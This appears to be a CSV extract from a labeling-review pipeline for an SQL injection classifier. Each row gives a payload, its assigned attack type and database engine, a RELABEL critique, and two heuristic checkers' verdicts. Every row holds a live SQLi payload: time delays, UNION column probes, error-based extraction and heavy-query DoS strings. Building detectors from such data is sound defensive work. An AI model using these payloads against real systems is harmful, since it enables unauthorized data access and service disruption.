id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
22851,"1%"" ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",time_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'heavy_query' (P4) but labeled 'time_blind' (P5),heavy_query,postgresql,"1%"" ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
22852,"-3782%"" ) or make_set ( 9354 = 9354,7185 ) and ( ""%"" = """,boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-3782%"" ) or make_set ( 9354 = 9354,7185 ) and ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
22853,1' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,postgresql,0.7,postgresql_cast,RELABEL,reasoning too short (15 chars),boolean_blind,postgresql,1' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
22854,"-5606 ) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-5606 ) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
22855,select pg_sleep ( 5 ) and ( 'itgc' = 'itgc,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,select pg_sleep ( 5 ) and ( 'itgc' = 'itgc,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
22856,"-9240' union all select 6538,6538,6538#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-9240' union all select 6538,6538,6538#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
22857,select case when 7634 = 3954 then 1 else null end--,boolean_blind,generic,0.5,case_null,RELABEL,reasoning too short (9 chars); confidence too low (0.50),boolean_blind,generic,select case when 7634 = 3954 then 1 else null end--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
22858,"1' ) where 9381 = 9381 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1' ) where 9381 = 9381 or elt ( 6272 = 6272,sleep ( 5 ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
22859,"1%"" ) ) or sleep ( 5 ) and ( ( ""%"" = """,time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,"1%"" ) ) or sleep ( 5 ) and ( ( ""%"" = """,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
22860,"1' ) where 6720 = 6720 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1' ) where 6720 = 6720 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
22861,"1%' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",time_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'heavy_query' (P4) but labeled 'time_blind' (P5),heavy_query,postgresql,"1%' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
22862,-7663' ) ) or 1558 = 1104 and ( ( 'wsrq' = 'wsrq,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-7663' ) ) or 1558 = 1104 and ( ( 'wsrq' = 'wsrq,False,0,boolean_blind,generic,Pattern match: 'or 1558 = 1104' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
22863,1 ) ) as rvex where 3462 = 3462 and 4595 = 4595#,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 ) ) as rvex where 3462 = 3462 and 4595 = 4595#,False,0,boolean_blind,generic,Pattern match: 'and 4595 = 4595' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
22864,1' ) where 4500 = 4500,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) where 4500 = 4500,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
22865,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
22866,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'nhrc' like 'nhrc,boolean_blind,generic,0.5,arithmetic,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'nhrc' like 'nhrc,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
22867,"-6357"" ) union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-6357"" ) union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
22868,1' ) where 5680 = 5680 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.5,arithmetic,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,1' ) where 5680 = 5680 and ( 3020 = 3020 ) *6703--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
22869,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'jylk' = 'jylk",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'jylk' = 'jylk",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
22870,"1 ) ) as jmcp where 8624 = 8624 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1 ) ) as jmcp where 8624 = 8624 union all select null,null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
22871,"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""bkrk"" = ""bkrk",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""bkrk"" = ""bkrk",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
22872,"-8794 ) ) ) union all select 5802,5802,5802--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-8794 ) ) ) union all select 5802,5802,5802--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
22873,"1%"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""%"" = """,time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"1%"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""%"" = """,False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
22874,"1"" ) ) as nhus where 3689 = 3689",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1"" ) ) as nhus where 3689 = 3689",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
22875,"-3228"" ) or ( 5901 = 1570 ) *1570 and ( ""egdd"" = ""egdd",boolean_blind,generic,0.5,arithmetic,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,"-3228"" ) or ( 5901 = 1570 ) *1570 and ( ""egdd"" = ""egdd",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
22876,1' where 7725 = 7725 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,1' where 7725 = 7725 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
22877,"select * from generate_series ( 7762,7762,case when ( 7762 = 1293 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars),boolean_blind,postgresql,"select * from generate_series ( 7762,7762,case when ( 7762 = 1293 ) then 1 else 0 end ) limit 1--",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
22878,"-3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,"-3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
22879,"-1722' union all select 1408,1408,1408#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-1722' union all select 1408,1408,1408#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
22880,-1940 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),boolean_blind,postgresql,0.7,postgresql_cast,RELABEL,reasoning too short (15 chars),boolean_blind,postgresql,-1940 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
22881,1'|| ( select 'npdx' from dual where 9486 = 9486 and sleep ( 5 ) ) ||',time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,1'|| ( select 'npdx' from dual where 9486 = 9486 and sleep ( 5 ) ) ||',False,0,time_blind,oracle,Pattern match: 'sleep (' → time_blind (P5); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
22882,1 ) as bidc where 5268 = 5268 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,1 ) as bidc where 5268 = 5268 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
22883,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
22884,1' ) ) as nsfx where 9553 = 9553 rlike sleep ( 5 ) --,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,1' ) ) as nsfx where 9553 = 9553 rlike sleep ( 5 ) --,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
22885,1 where 3744 = 3744,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 where 3744 = 3744,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
22886,"1, ( select 6825 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6825 = 6825,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1, ( select 6825 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6825 = 6825,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
22887,"1"" ) as eaxo where 2728 = 2728",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1"" ) as eaxo where 2728 = 2728",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
22888,"1"" ) ) as tsry where 6594 = 6594 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" ) ) as tsry where 6594 = 6594 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
22889,1' ) ) and 7533 = 7533 and ( ( 'gvoh' = 'gvoh,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) ) and 7533 = 7533 and ( ( 'gvoh' = 'gvoh,False,0,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
22890,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""vfvh"" = ""vfvh",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""vfvh"" = ""vfvh",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
22891,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'rupq' = 'rupq",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'rupq' = 'rupq",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
22892,-3501' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'spvx' = 'spvx,out_of_band,oracle,0.9,dbms_utility,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,-3501' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'spvx' = 'spvx,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
22893,"1' ) ) as xjen where 6791 = 6791 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1' ) ) as xjen where 6791 = 6791 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
22894,"1"" ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""sdvu"" like ""sdvu",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""sdvu"" like ""sdvu",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
22895,1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'brhc' like 'brhc,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'brhc' like 'brhc,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
22896,select ( case when ( 3486 = 6373 ) then 3486 else 3486* ( select 3486 from mysql.db ) end ) #,boolean_blind,mysql,0.7,mysql_db,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,select ( case when ( 3486 = 6373 ) then 3486 else 3486* ( select 3486 from mysql.db ) end ) #,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
22897,"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'mttj' like 'mttj",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'mttj' like 'mttj",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
22898,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,False,0,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
22899,"1"" where 3274 = 3274 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" where 3274 = 3274 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
22900,"1"" ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""cwpt"" like ""cwpt",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1"" ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""cwpt"" like ""cwpt",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
22901,"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'tvar' = 'tvar",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'tvar' = 'tvar",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
22902,1%' ) and sleep ( 5 ) and ( '%' = ',time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,1%' ) and sleep ( 5 ) and ( '%' = ',False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
22903,"-4770 ) ) ) union all select 6356,6356,6356,6356,6356#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-4770 ) ) ) union all select 6356,6356,6356,6356,6356#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
22904,"waitfor delay '0:0:5' and ( ( ( ""%"" = """,time_blind,mssql,0.9,waitfor,RELABEL,reasoning too short (7 chars),time_blind,mssql,"waitfor delay '0:0:5' and ( ( ( ""%"" = """,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
